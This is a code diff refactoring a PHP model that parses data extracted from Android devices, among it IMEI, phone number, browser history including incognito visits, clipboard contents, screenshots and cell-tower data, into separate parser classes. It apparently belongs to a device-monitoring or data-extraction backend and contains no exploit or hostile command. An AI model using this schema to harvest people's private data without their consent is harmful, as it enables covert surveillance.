-                'internal_storage_usable_gb'  => $json['internal_storage_usable_gb']  ?? null,
-                'external_storage_total_gb'   => $json['external_storage_total_gb']   ?? null,
-                'external_storage_free_gb'    => $json['external_storage_free_gb']    ?? null,
-                'phone_number'                => $json['phone_number']                ?? null,
-                'sim_operator'                => $json['sim_operator']                ?? null,
-                'network_operator'            => $json['network_operator']            ?? null,
-                'sim_country'                 => $json['sim_country']                 ?? null,
-                'network_country'             => $json['network_country']             ?? null,
-                'imei'                        => $json['imei']                        ?? null,
-                'meid'                        => $json['meid']                        ?? null,
-                'device_id'                   => $device_id,
-                'sim_state'                   => $json['sim_state']                   ?? null,
-                'language'                    => $json['language']                    ?? null,
-                'country'                     => $json['country']                     ?? null,
-                'timezone'                    => $json['timezone']                    ?? null,
-                'timezone_offset'             => $json['timezone_offset']             ?? null,
-                'current_time'                => $json['current_time']                ?? null,
-                'current_time_formatted'      => $json['current_time_formatted']      ?? null,
-                'battery_charging'            => isset($json['battery_charging'])     ? ($json['battery_charging'] ? 1 : 0) : null,
-                'battery_level'               => $json['battery_level']              ?? null,
-                'sensor_count'                => $json['sensor_count']               ?? null,
-                'mac_address'                 => $json['mac_address']                ?? null,
-                'kernel_info'                 => $json['kernel_info']                ?? null,
-                'is_emulator'                 => isset($json['is_emulator'])          ? ($json['is_emulator'] ? 1 : 0) : null,
-                'is_rooted'                   => isset($json['is_rooted'])            ? ($json['is_rooted'] ? 1 : 0) : null,
-                'app_package'                 => $json['app_package']                ?? null,
-                'app_version'                 => $json['app_version']                ?? null,
-                'app_version_code'            => $json['app_version_code']           ?? null,
-                'app_first_install'           => $json['app_first_install']          ?? null,
-                'app_last_update'             => $json['app_last_update']            ?? null,
-                'extraction_timestamp'        => $extracted_at,
-                'extractor_version'           => $json['extractor_version']          ?? '1.0',
-                'device_ip_address'           => $json['device_ip_address']          ?? null,
-            ];
-
-            $this->db->table('tbl_device_profiles')->insert($data);
-            log_message('info', '[parse_device_info] Inserted device snapshot for device: ' . $device_id);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_device_info] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\DeviceContextParser($this->db))->parse_device_info($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     // ─────────────────────────────────────────────────────────────────────────
@@ -1434,48 +798,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_accessibility(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated      = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $services     = $json['services'] ?? [];
-
-            // Avoid duplicate
-            $exists = $this->db->table('tbl_system_accessibility_services')
-                ->where('device_id', $device_id)
-                ->where('extracted_at', $extracted_at)
-                ->countAllResults() > 0;
-            if ($exists) return true;
-
-            foreach ($services as $svc) {
-                $this->db->table('tbl_system_accessibility_services')->insert([
-                    'owner_id'                    => $owner_id,
-                    'device_id'                   => $device_id,
-                    'service_id'                  => $svc['id'] ?? null,
-                    'package_name'                => $svc['package_name'] ?? null,
-                    'description'                 => $svc['description'] ?? null,
-                    'feedback_type'               => $svc['feedback_type'] ?? null,
-                    'capabilities'                => $svc['capabilities'] ?? null,
-                    'flags'                       => $svc['flags'] ?? null,
-                    'notification_timeout'        => $svc['notification_timeout'] ?? null,
-                    'settings_activity_name'      => $svc['settings_activity_name'] ?? null,
-                    'can_retrieve_window_content' => isset($svc['can_retrieve_window_content']) ? ($svc['can_retrieve_window_content'] ? 1 : 0) : null,
-                    'extracted_at'                => $extracted_at,
-                    'created_at'                  => $dated,
-                ]);
-            }
-
-            log_message('info', '[parse_accessibility] Inserted ' . count($services) . ' a11y services for device: ' . $device_id);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_accessibility] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\AppPermissionParser($this->db))->parse_accessibility($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -1485,66 +808,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_input_methods(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated      = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $imes         = $json['input_methods'] ?? [];
-
-            // Avoid duplicate
-            $exists = $this->db->table('tbl_system_input_methods')
-                ->where('device_id', $device_id)
-                ->where('extracted_at', $extracted_at)
-                ->countAllResults() > 0;
-            if ($exists) return true;
-
-            foreach ($imes as $ime) {
-                $this->db->table('tbl_system_input_methods')->insert([
-                    'owner_id'     => $owner_id,
-                    'device_id'    => $device_id,
-                    'ime_id'       => $ime['id'] ?? null,
-                    'package_name' => $ime['package_name'] ?? null,
-                    'label'        => $ime['label'] ?? null,
-                    'service_name' => $ime['service_name'] ?? null,
-                    'is_system'    => isset($ime['is_system']) ? ($ime['is_system'] ? 1 : 0) : 0,
-                    'is_auxiliary' => isset($ime['is_auxiliary']) ? ($ime['is_auxiliary'] ? 1 : 0) : 0,
-                    'extracted_at' => $extracted_at,
-                    'created_at'   => $dated,
-                ]);
-                $imeId = $this->db->insertID();
-
-                // Subtypes
-                $subtypes = $ime['subtypes'] ?? [];
-                if (!empty($subtypes) && $imeId > 0) {
-                    $batch = [];
-                    foreach ($subtypes as $st) {
-                        $batch[] = [
-                            'input_method_id'                    => $imeId,
-                            'owner_id'                           => $owner_id,
-                            'locale'                             => $st['locale'] ?? null,
-                            'mode'                               => $st['mode'] ?? null,
-                            'name'                               => $st['name'] ?? null,
-                            'is_ascii_capable'                   => isset($st['is_ascii_capable']) ? ($st['is_ascii_capable'] ? 1 : 0) : 0,
-                            'is_auxiliary'                       => isset($st['is_auxiliary']) ? ($st['is_auxiliary'] ? 1 : 0) : 0,
-                            'overrides_implicitly_enabled_subtype' => isset($st['overrides_implicitly_enabled_subtype']) ? ($st['overrides_implicitly_enabled_subtype'] ? 1 : 0) : 0,
-                            'created_at'                         => $dated,
-                        ];
-                    }
-                    $this->db->table('tbl_system_input_method_subtypes')->insertBatch($batch);
-                }
-            }
-
-            log_message('info', '[parse_input_methods] Inserted ' . count($imes) . ' IMEs for device: ' . $device_id);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_input_methods] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\AppPermissionParser($this->db))->parse_input_methods($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -1554,65 +818,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_cell_towers(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated      = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $towers       = $json['cell_towers'] ?? [];
-
-            // Avoid duplicate
-            $exists = $this->db->table('tbl_telemetry_cell_towers')
-                ->where('device_id', $device_id)
-                ->where('extracted_at', $extracted_at)
-                ->countAllResults() > 0;
-            if ($exists) return true;
-
-            foreach ($towers as $tower) {
-                $this->db->table('tbl_telemetry_cell_towers')->insert([
-                    'owner_id'         => $owner_id,
-                    'device_id'        => $device_id,
-                    'tower_type'       => $tower['type'] ?? null,
-                    'cid'              => $tower['cid'] ?? $tower['nci'] ?? $tower['base_station_id'] ?? null,
-                    'lac'              => $tower['lac'] ?? $tower['tac'] ?? $tower['network_id'] ?? null,
-                    'mcc'              => $tower['mcc'] ?? $tower['mccString'] ?? null,
-                    'mnc'              => $tower['mnc'] ?? $tower['mncString'] ?? null,
-                    'pci'              => $tower['pci'] ?? null,
-                    'nci'              => $tower['nci'] ?? null,
-                    'tac'              => $tower['tac'] ?? null,
-                    'nrarfcn'          => $tower['nrarfcn'] ?? null,
-                    'bandwidth'        => $tower['bandwidth'] ?? null,
-                    'psc'              => $tower['psc'] ?? null,
-                    'system_id'        => $tower['system_id'] ?? null,
-                    'rssi'             => $tower['rssi'] ?? null,
-                    'rsrp'             => $tower['rsrp'] ?? null,
-                    'rsrq'             => $tower['rsrq'] ?? null,
-                    'rssnr'            => $tower['rssnr'] ?? null,
-                    'cqi'              => $tower['cqi'] ?? null,
-                    'asu_level'        => $tower['asu_level'] ?? null,
-                    'csi_rsrp'         => $tower['csi_rsrp'] ?? null,
-                    'csi_rsrq'         => $tower['csi_rsrq'] ?? null,
-                    'csi_sinr'         => $tower['csi_sinr'] ?? null,
-                    'is_registered'    => isset($tower['is_registered']) ? ($tower['is_registered'] ? 1 : 0) : 0,
-                    'network_operator' => $json['network_operator'] ?? null,
-                    'network_operator_name' => $json['network_operator_name'] ?? null,
-                    'phone_type'       => $json['phone_type'] ?? null,
-                    'sim_state'        => $json['sim_state'] ?? null,
-                    'extracted_at'     => $extracted_at,
-                    'created_at'       => $dated,
-                ]);
-            }
-
-            log_message('info', '[parse_cell_towers] Inserted ' . count($towers) . ' towers for device: ' . $device_id);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_cell_towers] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\SensorsEnvironmentParser($this->db))->parse_cell_towers($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -1771,76 +977,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_thermal(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated      = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $zones        = $json['thermal_zones'] ?? [];
-            $cpu_throttle = $json['cpu_throttle'] ?? [];
-            $cpu_freqs    = $json['cpu_frequencies'] ?? [];
-
-            // Avoid duplicate
-            $exists = $this->db->table('tbl_telemetry_thermal')
-                ->where('device_id', $device_id)
-                ->where('extracted_at', $extracted_at)
-                ->countAllResults() > 0;
-            if ($exists) return true;
-
-            foreach ($zones as $zone) {
-                $this->db->table('tbl_telemetry_thermal')->insert([
-                    'owner_id'     => $owner_id,
-                    'device_id'    => $device_id,
-                    'zone_name'    => $zone['zone'] ?? null,
-                    'zone_type'    => $zone['type'] ?? null,
-                    'temp_raw'     => $zone['temp_raw'] ?? null,
-                    'temp_celsius' => $zone['temp_celsius'] ?? null,
-                    'policy'       => $zone['policy'] ?? null,
-                    'data_type'    => 'thermal_zone',
-                    'extracted_at' => $extracted_at,
-                    'created_at'   => $dated,
-                ]);
-            }
-
-            foreach ($cpu_throttle as $throttle) {
-                $this->db->table('tbl_telemetry_thermal')->insert([
-                    'owner_id'     => $owner_id,
-                    'device_id'    => $device_id,
-                    'cpu_name'     => $throttle['cpu'] ?? null,
-                    'core_limit_max' => $throttle['core_limit_max'] ?? null,
-                    'package_limit_max' => $throttle['package_limit_max'] ?? null,
-                    'throttle_count'   => $throttle['throttle_count'] ?? null,
-                    'data_type'    => 'cpu_throttle',
-                    'extracted_at' => $extracted_at,
-                    'created_at'   => $dated,
-                ]);
-            }
-
-            foreach ($cpu_freqs as $freq) {
-                $this->db->table('tbl_telemetry_thermal')->insert([
-                    'owner_id'         => $owner_id,
-                    'device_id'        => $device_id,
-                    'cpu_name'         => $freq['cpu'] ?? null,
-                    'scaling_min_freq' => $freq['scaling_min_freq'] ?? null,
-                    'scaling_max_freq' => $freq['scaling_max_freq'] ?? null,
-                    'scaling_cur_freq' => $freq['scaling_cur_freq'] ?? null,
-                    'scaling_governor' => $freq['scaling_governor'] ?? null,
-                    'data_type'        => 'cpu_frequency',
-                    'extracted_at'     => $extracted_at,
-                    'created_at'       => $dated,
-                ]);
-            }
-
-            log_message('info', '[parse_thermal] Inserted thermal data for device: ' . $device_id);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_thermal] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\SensorsEnvironmentParser($this->db))->parse_thermal($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -1850,42 +987,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_nfc(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated      = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-
-            // Avoid duplicate
-            $exists = $this->db->table('tbl_telemetry_nfc')
-                ->where('device_id', $device_id)
-                ->where('extracted_at', $extracted_at)
-                ->countAllResults() > 0;
-            if ($exists) return true;
-
-            $this->db->table('tbl_telemetry_nfc')->insert([
-                'owner_id'           => $owner_id,
-                'device_id'          => $device_id,
-                'nfc_available'      => isset($json['nfc_available']) ? ($json['nfc_available'] ? 1 : 0) : 0,
-                'nfc_supported'      => isset($json['nfc_supported']) ? ($json['nfc_supported'] ? 1 : 0) : 0,
-                'nfc_enabled'        => isset($json['nfc_enabled']) ? ($json['nfc_enabled'] ? 1 : 0) : 0,
-                'nfc_secure_nfc'     => isset($json['nfc_secure_nfc']) ? ($json['nfc_secure_nfc'] ? 1 : 0) : 0,
-                'nfc_secure_supported' => isset($json['nfc_secure_nfc_supported']) ? ($json['nfc_secure_nfc_supported'] ? 1 : 0) : 0,
-                'features_json'      => isset($json['nfc_features']) ? json_encode($json['nfc_features']) : null,
-                'extracted_at'       => $extracted_at,
-                'created_at'         => $dated,
-            ]);
-
-            log_message('info', '[parse_nfc] Inserted NFC info for device: ' . $device_id);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_nfc] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\SensorsEnvironmentParser($this->db))->parse_nfc($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -2513,67 +1615,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
      */
     public function parse_app_permissions(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $list = $json['permissions_list'] ?? [];
-            if (!is_array($list)) return false;
-
-            $batch = [];
-            foreach ($list as $perm) {
-                $pkg = $perm['package_name'] ?? null;
-                $name = $perm['permission_name'] ?? null;
-                if (!$pkg || !$name) continue;
-
-                $exists = $this->db->table('tbl_system_app_permissions')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('package_name', $pkg)
-                    ->where('permission_name', $name)
-                    ->countAllResults() > 0;
-                if ($exists) continue;
-
-                $batch[] = [
-                    'owner_id' => $owner_id,
-                    'device_id' => $device_id,
-                    'package_name' => $pkg,
-                    'permission_name' => $name,
-                    'is_requested' => isset($perm['is_requested']) ? ($perm['is_requested'] ? 1 : 0) : 1,
-                    'is_granted' => isset($perm['is_granted']) ? ($perm['is_granted'] ? 1 : 0) : 0,
-                    'is_runtime' => isset($perm['is_runtime']) ? ($perm['is_runtime'] ? 1 : 0) : 0,
-                    'is_system_fixed' => isset($perm['is_system_fixed']) ? ($perm['is_system_fixed'] ? 1 : 0) : 0,
-                    'is_revoked' => isset($perm['is_revoked']) ? ($perm['is_revoked'] ? 1 : 0) : 0,
-                    'grant_time' => $perm['grant_time'] ?? null,
-                    'last_used_time' => $perm['last_used_time'] ?? null,
-                    'flags' => $perm['flags'] ?? null,
-                    'is_one_time' => isset($perm['is_one_time']) ? ($perm['is_one_time'] ? 1 : 0) : 0,
-                    'is_auto_revoke_whitelisted' => isset($perm['is_auto_revoke_whitelisted']) ? ($perm['is_auto_revoke_whitelisted'] ? 1 : 0) : 0,
-                    'is_hard_restricted' => isset($perm['is_hard_restricted']) ? ($perm['is_hard_restricted'] ? 1 : 0) : 0,
-                    'is_soft_restricted' => isset($perm['is_soft_restricted']) ? ($perm['is_soft_restricted'] ? 1 : 0) : 0,
-                    'user_set' => isset($perm['user_set']) ? ($perm['user_set'] ? 1 : 0) : 0,
-                    'fixed_policy' => isset($perm['fixed_policy']) ? ($perm['fixed_policy'] ? 1 : 0) : 0,
-                    'extracted_at' => $extracted_at,
-                    'created_at' => $dated,
-                    'updated_at' => $dated,
-                ];
-            }
-
-            if (!empty($batch)) {
-                $this->db->table('tbl_system_app_permissions')->insertBatch($batch);
-            }
-
-            log_message('info', '[parse_app_permissions] Inserted ' . count($batch) . ' permissions from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_app_permissions] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\AppPermissionParser($this->db))->parse_app_permissions($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -2582,67 +1624,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
      */
     public function parse_browser_history(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $list = $json['history_list'] ?? [];
-            if (!is_array($list)) return false;
-
-            $batch = [];
-            foreach ($list as $item) {
-                $url = $item['url'] ?? null;
-                if (!$url) continue;
-
-                $exists = $this->db->table('tbl_extracted_browser_history')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('url', $url)
-                    ->countAllResults() > 0;
-                if ($exists) continue;
-
-                $batch[] = [
-                    'owner_id' => $owner_id,
-                    'device_id' => $device_id,
-                    'browser_package' => $item['browser_package'] ?? null,
-                    'url' => $url,
-                    'title' => $item['title'] ?? null,
-                    'visit_count' => $item['visit_count'] ?? null,
-                    'last_visit_time' => $item['last_visit_time'] ?? null,
-                    'typed_count' => $item['typed_count'] ?? null,
-                    'favicon_base64' => $item['favicon_base64'] ?? null,
-                    'is_bookmark' => isset($item['is_bookmark']) ? ($item['is_bookmark'] ? 1 : 0) : 0,
-                    'bookmark_folder' => $item['bookmark_folder'] ?? null,
-                    'transition_type' => $item['transition_type'] ?? null,
-                    'referrer_url' => $item['referrer_url'] ?? null,
-                    'visit_duration_ms' => $item['visit_duration_ms'] ?? null,
-                    'search_terms' => $item['search_terms'] ?? null,
-                    'is_incognito' => isset($item['is_incognito']) ? ($item['is_incognito'] ? 1 : 0) : 0,
-                    'domain' => $item['domain'] ?? null,
-                    'scheme' => $item['scheme'] ?? null,
-                    'path_depth' => $item['path_depth'] ?? null,
-                    'query_params' => $item['query_params'] ?? null,
-                    'extracted_at' => $extracted_at,
-                    'created_at' => $dated,
-                    'updated_at' => $dated,
-                ];
-            }
-
-            if (!empty($batch)) {
-                $this->db->table('tbl_extracted_browser_history')->insertBatch($batch);
-            }
-
-            log_message('info', '[parse_browser_history] Inserted ' . count($batch) . ' history rows from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_browser_history] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\UserPrivacyParser($this->db))->parse_browser_history($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -2651,43 +1633,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
      */
     public function parse_clipboard(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-
-            $data = [
-                'owner_id' => $owner_id,
-                'device_id' => $device_id,
-                'clip_data_type' => $json['clip_data_type'] ?? null,
-                'clip_text' => $json['clip_text'] ?? null,
-                'clip_html' => $json['clip_html'] ?? null,
-                'clip_intent_action' => $json['clip_intent_action'] ?? null,
-                'clip_intent_package' => $json['clip_intent_package'] ?? null,
-                'clip_uri' => $json['clip_uri'] ?? null,
-                'item_count' => $json['item_count'] ?? null,
-                'primary_clip_description' => $json['primary_clip_description'] ?? null,
-                'timestamp' => $json['timestamp'] ?? null,
-                'source_package' => $json['source_package'] ?? null,
-                'label' => $json['label'] ?? null,
-                'is_sensitive' => isset($json['is_sensitive']) ? ($json['is_sensitive'] ? 1 : 0) : 0,
-                'extracted_at' => $extracted_at,
-                'created_at' => $dated,
-                'updated_at' => $dated,
-            ];
-
-            $this->db->table('tbl_extracted_clipboard_entries')->insert($data);
-            log_message('info', '[parse_clipboard] Inserted clipboard snapshot for device: ' . $device_id);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_clipboard] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\UserPrivacyParser($this->db))->parse_clipboard($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -2762,72 +1708,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
      */
     public function parse_crash_logs(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $list = $json['crash_list'] ?? [];
-            if (!is_array($list)) return false;
-
-            $batch = [];
-            foreach ($list as $crash) {
-                $pid = $crash['pid'] ?? null;
-                $crashTime = $crash['crash_time'] ?? null;
-                if ($pid === null || !$crashTime) continue;
-
-                $exists = $this->db->table('tbl_system_crash_logs')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('pid', $pid)
-                    ->where('crash_time', $crashTime)
-                    ->countAllResults() > 0;
-                if ($exists) continue;
-
-                $batch[] = [
-                    'owner_id' => $owner_id,
-                    'device_id' => $device_id,
-                    'package_name' => $crash['package_name'] ?? null,
-                    'process_name' => $crash['process_name'] ?? null,
-                    'pid' => $pid,
-                    'uid' => $crash['uid'] ?? null,
-                    'crash_time' => $crashTime,
-                    'crash_type' => $crash['crash_type'] ?? null,
-                    'exception_class' => $crash['exception_class'] ?? null,
-                    'exception_message' => $crash['exception_message'] ?? null,
-                    'stack_trace' => $crash['stack_trace'] ?? null,
-                    'build_fingerprint' => $crash['build_fingerprint'] ?? null,
-                    'android_version' => $crash['android_version'] ?? null,
-                    'device_model' => $crash['device_model'] ?? null,
-                    'is_system_app' => isset($crash['is_system_app']) ? ($crash['is_system_app'] ? 1 : 0) : 0,
-                    'is_silent' => isset($crash['is_silent']) ? ($crash['is_silent'] ? 1 : 0) : 0,
-                    'is_user_perceived' => isset($crash['is_user_perceived']) ? ($crash['is_user_perceived'] ? 1 : 0) : 0,
-                    'logcat_tail' => $crash['logcat_tail'] ?? null,
-                    'dropbox_tag' => $crash['dropbox_tag'] ?? null,
-                    'dropbox_data' => $crash['dropbox_data'] ?? null,
-                    'tombstone_path' => $crash['tombstone_path'] ?? null,
-                    'minidump_path' => $crash['minidump_path'] ?? null,
-                    'last_crash_time' => $crash['last_crash_time'] ?? null,
-                    'extracted_at' => $extracted_at,
-                    'created_at' => $dated,
-                    'updated_at' => $dated,
-                ];
-            }
-
-            if (!empty($batch)) {
-                $this->db->table('tbl_system_crash_logs')->insertBatch($batch);
-            }
-
-            log_message('info', '[parse_crash_logs] Inserted ' . count($batch) . ' crashes from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_crash_logs] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\UserPrivacyParser($this->db))->parse_crash_logs($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -3113,58 +1994,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
      */
     public function parse_keyboard_input(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $list = $json['ime_list'] ?? [];
-            if (!is_array($list)) return false;
-
-            $batch = [];
-            foreach ($list as $ime) {
-                $imeId = $ime['ime_id'] ?? null;
-                if (!$imeId) continue;
-
-                $exists = $this->db->table('tbl_keyboard_input')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('ime_id', $imeId)
-                    ->countAllResults() > 0;
-                if ($exists) continue;
-
-                $batch[] = [
-                    'owner_id' => $owner_id,
-                    'device_id' => $device_id,
-                    'ime_package' => $ime['ime_package'] ?? null,
-                    'ime_id' => $imeId,
-                    'ime_label' => $ime['ime_label'] ?? null,
-                    'is_enabled' => isset($ime['is_enabled']) ? ($ime['is_enabled'] ? 1 : 0) : 0,
-                    'is_default' => isset($ime['is_default']) ? ($ime['is_default'] ? 1 : 0) : 0,
-                    'is_system_ime' => isset($ime['is_system_ime']) ? ($ime['is_system_ime'] ? 1 : 0) : 0,
-                    'is_auxiliary' => isset($ime['is_auxiliary']) ? ($ime['is_auxiliary'] ? 1 : 0) : 0,
-                    'supports_switching_to_next_input_method' => isset($ime['supports_switching_to_next_input_method']) ? ($ime['supports_switching_to_next_input_method'] ? 1 : 0) : 0,
-                    'subtypes' => is_array($ime['subtypes'] ?? null) ? json_encode($ime['subtypes']) : ($ime['subtypes'] ?? null),
-                    'extracted_at' => $extracted_at,
-                    'created_at' => $dated,
-                    'updated_at' => $dated,
-                ];
-            }
-
-            if (!empty($batch)) {
-                $this->db->table('tbl_keyboard_input')->insertBatch($batch);
-            }
-
-            log_message('info', '[parse_keyboard_input] Inserted ' . count($batch) . ' IME rows from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_keyboard_input] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\UserPrivacyParser($this->db))->parse_keyboard_input($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -3226,74 +2056,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
      */
     public function parse_screenshots(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $list = $json['screenshot_list'] ?? [];
-            if (!is_array($list)) return false;
-
-            $batch = [];
-            foreach ($list as $item) {
-                $filePath = $item['file_path'] ?? null;
-                $timestamp = $item['timestamp'] ?? null;
-                if (!$filePath || !$timestamp) continue;
-
-                $exists = $this->db->table('tbl_extracted_screenshots')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('file_path', $filePath)
-                    ->where('timestamp', $timestamp)
-                    ->countAllResults() > 0;
-                if ($exists) continue;
-
-                $batch[] = [
-                    'owner_id' => $owner_id,
-                    'device_id' => $device_id,
-                    'file_path' => $filePath,
-                    'file_name' => $item['file_name'] ?? null,
-                    'file_size' => $item['file_size'] ?? null,
-                    'mime_type' => $item['mime_type'] ?? null,
-                    'width' => $item['width'] ?? null,
-                    'height' => $item['height'] ?? null,
-                    'timestamp' => $timestamp,
-                    'source_package' => $item['source_package'] ?? null,
-                    'is_screen_record' => isset($item['is_screen_record']) ? ($item['is_screen_record'] ? 1 : 0) : 0,
-                    'duration_ms' => $item['duration_ms'] ?? null,
-                    'video_path' => $item['video_path'] ?? null,
-                    'video_size' => $item['video_size'] ?? null,
-                    'video_width' => $item['video_width'] ?? null,
-                    'video_height' => $item['video_height'] ?? null,
-                    'video_duration_ms' => $item['video_duration_ms'] ?? null,
-                    'video_frame_rate' => $item['video_frame_rate'] ?? null,
-                    'video_bitrate' => $item['video_bitrate'] ?? null,
-                    'is_edited' => isset($item['is_edited']) ? ($item['is_edited'] ? 1 : 0) : 0,
-                    'edit_timestamp' => $item['edit_timestamp'] ?? null,
-                    'edit_app_package' => $item['edit_app_package'] ?? null,
-                    'contains_pii' => isset($item['contains_pii']) ? ($item['contains_pii'] ? 1 : 0) : 0,
-                    'pii_types' => is_array($item['pii_types'] ?? null) ? json_encode($item['pii_types']) : ($item['pii_types'] ?? null),
-                    'detection_confidence' => $item['detection_confidence'] ?? null,
-                    'extracted_at' => $extracted_at,
-                    'created_at' => $dated,
-                    'updated_at' => $dated,
-                ];
-            }
-
-            if (!empty($batch)) {
-                $this->db->table('tbl_extracted_screenshots')->insertBatch($batch);
-            }
-
-            log_message('info', '[parse_screenshots] Inserted ' . count($batch) . ' screenshots from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_screenshots] Exception: ' . $e->getMessage());
-            return false;
-        }
